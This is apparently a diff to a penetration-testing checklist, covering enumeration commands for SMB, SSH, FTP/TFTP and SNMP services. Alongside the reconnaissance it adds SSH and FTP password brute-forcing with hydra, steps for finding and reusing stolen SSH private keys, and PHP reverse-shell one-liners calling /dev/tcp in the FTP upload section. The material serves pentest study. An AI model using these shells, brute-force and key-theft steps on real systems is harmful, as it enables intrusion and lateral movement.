@@ -6,11 +6,15 @@
 - [ ] **SMB Protocol Negotiation**:
   ```bash
   nmap --script smb-protocols <target>
+  or
+  nmap -p 445 --script smb-os-discovery,smb-enum-users,smb-enum-shares <TARGET_IP>
   ```
 - [ ] **Share Enumeration**:
   ```bash
+  # anonymous access (Leave Password Blank)
   smbclient -L //<target> -N
   smbclient -L //<target> -U guest%
+  smbclient -L //<TARGET_IP>/ --no-pass
   ```
 - [ ] **Comprehensive SMB Enum**:
   ```bash
@@ -25,6 +29,7 @@
   ```
 - [ ] **SMB Share Access**:
   ```bash
+  # Connect to a specific share:
   smbclient //<target>/<share> -N
   smbmap -H <target>
   smbmap -H <target> -u null -p null
@@ -34,11 +39,61 @@
   rpcclient -U "" -N <target>
   # Commands: enumdomusers, enumdomgroups, queryuser <rid>
   ```
+- [ ] **SMB Recon with CME**
 
+```bash
+/usr/bin/crackmapexec smb <TARGET_IP> --shares
+/usr/bin/crackmapexec smb <TARGET_IP> --sessions
+/usr/bin/crackmapexec smb <TARGET_IP> --users
+/usr/bin/crackmapexec smb <TARGET_IP> -u '' -p '' --shares # Anonymous test
+```
+- [ ] **SMB Recon with NetExec (NXC)**
+```bash
+/usr/bin/nxc smb <TARGET_IP> --shares
+/usr/bin/nxc smb <TARGET_IP> --users
+/usr/bin/nxc smb <TARGET_IP> --sessions
+/usr/bin/nxc smb <TARGET_IP> -u guest -p '' --shares
+```
+- [ ] **SMB Recon with Impacket**
+```bash
+## List shares (no auth):
+/usr/share/doc/python3-impacket/examples/smbclient.py <TARGET_IP> -no-pass
+
+## Dump SMB password policy:
+/usr/share/doc/python3-impacket/examples/polenum.py <TARGET_IP>
+
+#→ If authentication is required:
+/usr/share/doc/python3-impacket/examples/polenum.py -u <user> -p <pass> <TARGET_IP>
+```
+- [ ] **Mounting SMB Share Locally**
+```bash
+mkdir -p /mnt/smb
+mount -t cifs //<TARGET_IP>/public /mnt/smb -o guest
+cd /mnt/smb && ls -la
+```
+
+- [ ] **SMB With Metasploit**
+```bash
+## Enumerate shares:
+sudo msfconsole -q
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS <TARGET_IP>
+run
+
+## Enumerate users:
+use auxiliary/scanner/smb/smb_enumusers
+set RHOSTS <TARGET_IP>
+run
+```
 ---
 
 ## SSH (22)
 ### Basic Enumeration
+
+- [ ] **SMB With Metasploit**
+  ```bash
+  nmap -p 22 -sV -sC <TARGET_IP>
+  ```
 - [ ] **Banner Grabbing**:
   ```bash
   nc <target> 22
@@ -47,6 +102,45 @@
 - [ ] **SSH Audit**:
   ```bash
   ssh-audit <target>
+  ```
+- [ ] **Searchsploit**
+  ```bash
+  searchsploit openssh <VERSION_FROM_NMAP>
+  ```
+
+- [ ] **Run SSH brute-force login attempt (if usernames are known)**
+  ```bash
+  hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+
+  # Multiple Users
+  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+
+  #or
+  nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=rockyou.txt <TARGET_IP>
+  ```
+
+- [ ] **Check for default or easy creds manually**
+  ```bash
+  ssh <USERNAME>@<TARGET_IP>
+  ```
+- [ ] **Check for authorized SSH keys or reuse**
+  ```bash
+  cat ~/.ssh/authorized_keys
+  ```
+
+- [ ] **Look for `.ssh/id_rsa` or `known_hosts`   in home directories (post-exploit)**
+  ```bash
+  find /home -name id_rsa 2>/dev/null
+  ```
+- [ ] **Login with Private Key**
+  ```bash
+  ssh -i id_rsa <USERNAME>@<TARGET_IP>
+  #Make sure permissions are:
+  chmod 600 id_rsa
+  ```
+- [ ] **Target SSH on Non-Standard Port**
+  ```bash
+  ssh -p <PORT> <USERNAME>@<TARGET_IP>
   ```
 
 ### Advanced SSH Testing
@@ -60,6 +154,33 @@
   ```
 - [ ] **SSH Tunneling Opportunities**: Note for later lateral movement
 
+### Post Exploit SSH 
+- [ ] **Check for SSH Private Keys (for Pivot or Priv-Esc)**
+  ```bash
+  find /home -name id_rsa 2>/dev/null
+  #or
+  find / -name id_rsa 2>/dev/null
+  ```
+
+- [ ] **Look for Saved Credentials in Known Hosts or Keys**
+  ```bash
+  cat ~/.ssh/known_hosts
+  #or
+  cat ~/.ssh/id_rsa.pub
+  ```
+- [ ] **Copy a Found Key and Use It to Access Another System**
+  ```bash
+  scp <USERNAME>@<TARGET_IP>:/home/<user>/.ssh/id_rsa .
+  #and
+  chmod 600 id_rsa
+  #and
+  ssh -i id_rsa <USER>@<OTHER_HOST>
+  ```
+- [ ] **Check if Root’s SSH Keys Are World-Readable**
+  ```bash
+  ls -la /root/.ssh/
+  ```
+## **If successful, peform information gathering on Linux**
 ---
 
 ## FTP/TFTP (21/69)
@@ -74,6 +195,16 @@
   nc <target> 21
   nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <target>
   ```
+- [ ] **Search for Public Exploits**:
+  ```bash
+  searchsploit vsftpd <VERSION>
+
+  #See one? Grab it:
+  Ex: searchsploit -m unix/remote/49757.py
+  #then
+  ls -l 49757.py
+  ```
+
 
 ####Advanced FTP Enumeration
 - [ ] **FTP Brute Force** (if needed):
@@ -84,16 +215,186 @@
   ```bash
   tftp <target>
   # Try: get /etc/passwd
+  # Try to download a commonly named config file:
+    tftp> get test.txt
+    tftp> get backup.cfg
+    tftp> quit
+    #Try uploading (if allowed):
+    tftp <TARGET_IP>
+    tftp> put shell.sh
+    tftp> quit
   ```
+#### FTP Notes
+```bash
+#331 Please specify the password.
+#230 Login successful.
 
+#What you can do as your next steps:
+#→ Use `ls`, `get`, and `cd` to browse and download files.
+#→ Look for credentials, backup files, or web content.
+#→ If write is allowed, consider uploading a web shell (if served over HTTP).
+```
+- [ ] **Listing Files and Directories**
+  ```bash
+  ls or `dir`
+  cd <folder>
+  pwd
+  get <filename>
+  put <filename>
+    # IF PUT WORKS
+      cp /usr/share/webshells/php/php-reverse-shell.php .
+      #or
+      <?php system("bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1'"); ?>
+      #or
+      echo "<?php system('bash -c \"bash -i >& /dev/tcp/YOUR IP/4444 0>&1\"'); ?>" > rev.php
+    # Edit the Shell
+    $ip = 'YOUR_IP'; // your tun0 IP (VPN)
+    $port = 4444; // port you’ll listen on
+
+      put test.php
+      #then: Start Your Listener: 
+      nc -lvnp 4444
+      #In browser: 
+      http://<TARGET_IP>/test.php
+    #should receive a shell, Upgrade it
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+- [ ] **Bruteforce FTP Login**
+  ```bash
+  hydra -L users.txt -P passwords.txt ftp://<TARGET_IP> -o ftp_brute.txt
+  ```
 ---
 
 ## SNMP (161/UDP)
 ### Basic SNMP Enumeration
+- [ ] **RUN NMAP**:
+  ```bash
+  nmap -sU -p 161 --script snmp* -Pn <TARGET_IP>
+  ```
+
+- [ ] **Scan for common community strings using Common OneSixtyOne Wordlist**:
+  ```bash
+  #If onesixtyone is not installed/working:
+  sudo apt install onesixtyone
+  #Then run
+  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <TARGET_IP>
+  onesixtyone -c /usr/share/metasploit-framework/data/wordlists/nmp_default_pass.txt <TARGET_IP>
+  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-comm.txt <TARGET_IP>
+  #Example Results:
+  [192.168.62.34] - public
+  [192.168.62.34] - private
+  ```
+- [ ] **SNMP TREE DUMP**:
+  ```bash
+  #First make sure you have snmp mibs installed:
+  sudo apt-get install snmp-mibs-downloader
+  #then
+  snmpwalk -v2c -c `<COMMUNITY_STRING>` <TARGET_IP>
+  #or
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP>
+  #Example Results:
+  SNMPv2-MIB::sysName.0 = STRING: server01
+  SNMPv2-MIB::sysContact.0 = STRING: admin@example.com
+  SNMPv2-MIB::sysDescr.0 = STRING: Linux ubuntu 4.15.0-45-genericConfirm MIBS is hashed out via: /etc/snmp/.conf
+- [ ] **Enumerate Running ProcessesP**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
+  #Example Results:
+  HOST-RESOURCES-MIB::hrSWRunName.1234 = STRING: "sshd"
+  HOST-RESOURCES-MIB::hrSWRunName.1235 = STRING: "cron"
+  HOST-RESOURCES-MIB::hrSWRunName.1236 = STRING: "bash"
+- [ ] **Enumerate Installed Software**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
+  #Example Results:
+  HOST-RESOURCES-MIB::hrSWInstalledName.1 = STRING: "Nmap 7.91"
+  HOST-RESOURCES-MIB::hrSWInstalledName.2 = STRING: "Putty"
+  HOST-RESOURCES-MIB::hrSWInstalledName.3 = STRING: "Wireshark"
+- [ ] **Enumerate User Accounts**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
+  #Example Results:
+  iso.3.6.1.4.1.77.1.2.25.1.1.1 = STRING: "Administrator"
+  iso.3.6.1.4.1.77.1.2.25.1.1.2 = STRING: "Guest"
+  iso.3.6.1.4.1.77.1.2.25.1.1.3 = STRING: "jack"
+- [ ] **  OTHER STRINGS OF INTEREST**:
+  ```bash
+  1.3.6.1.2.1.25.1.6.0 System Processes
+  1.3.6.1.2.1.25.4.2.1.2 Running Programs
+  1.3.6.1.2.1.25.4.2.1.4 Processes Path
+  1.3.6.1.2.1.25.2.3.1.4 Storage Units
+  1.3.6.1.2.1.25.6.3.1.2 Software Name
+  1.3.6.1.4.1.77.1.2.25 User Accounts
+  1.3.6.1.2.1.6.13.1.3 TCP Local Ports
+- [ ] **Discover Extended SNMP Commands (Net-SNMP extend)**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand
+  #Example Results:
+  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."passwd" = STRING: /bin/cat /root/creds.txt
+  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."status" = STRING: /usr/bin/uptime
+
+- [ ] **Get Output of Extended SNMP Commands**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+  #ExampleResults:
+  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: bobby:NOTaRealPassword
+  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."status" = STRING: 01:42:30 up 4 days, 3:44, 2 users, load average: 0.02, 0.04, 0.05
+- [ ] **  Walk the Entire SNMP Tree (Full OID Fuzz)**:
+  ```bash
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1
+  #Example Results:
+  SNMPv2-MIB::sysDescr.0 = STRING: Linux target 4.19.0
+  ...
+  HOST-RESOURCES-MIB::hrSWRunName.1023 = STRING: "apache2"
+  ...
+  iso.3.6.1.4.1.77.1.2.25.1.1.1 = STRING: "admin"
+
+  #Use SNMP-check (if installed) for structured output:
+  snmp-check <TARGET_IP> -c public
+
+  #What Commands are Available?
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand
+  Exmple RESULTS:
+  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."passwd" = STRING: /bin/cat /root/creds.txt  NET-SNMP-EXTEND-MIB::nsExtendConfigCommand."scan" = STRING: /usr/local/bin/scan_network.sh
+
+  #To Get the Output of Those Commands
+  snmpwalk -v 1 -c <COMMUNITY STRING> <TARGET IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+  #Example RESULTS:
+  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."passwd" = STRING: USERNAME:PASSWORD
+  NET-SNMP-EXTEND-MIB::nsExtendOutputFull."scan" = STRING: Alive hosts: <HOST IP>, <HOST IP>
+  ```
 - [ ] **Community String Testing**:
   ```bash
   snmpwalk -v2c -c public <target>
   snmpwalk -v2c -c private <target>
+  #Run Nmap UDP script scan for SNMP detection
+  nmap -sU -p 161 --script snmp* -Pn <TARGET_IP>
+
+  #Brute-force community strings (stop here if none work)
+  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-comm.txt <TARGET_IP>
+
+  #Check if SNMP v1 responds to valid community string (e.g., "public")
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP>
+
+  #Dump system description, hostname, and uptime
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> SNMPv2-MIB::sysDescr
+
+  #Enumerate running processes
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.4.2.1.2
+
+  #Enumerate local user accounts (especially on Windows)
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
+
+  #Enumerate installed software
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1.3.6.1.2.1.25.6.3.1.2
+
+  #Discover extended SNMP commands (Net-SNMP Extend MIB)
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendConfigCommand
+
+  #Dump output of extended SNMP commands (if any found)
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+
+  #Walk full SNMP OID tree for hidden or custom data (optional, noisy)
+  snmpwalk -v 1 -c <COMMUNITY_STRING> <TARGET_IP> 1
   ```
 - [ ] **SNMP Brute-force**:
   ```bash
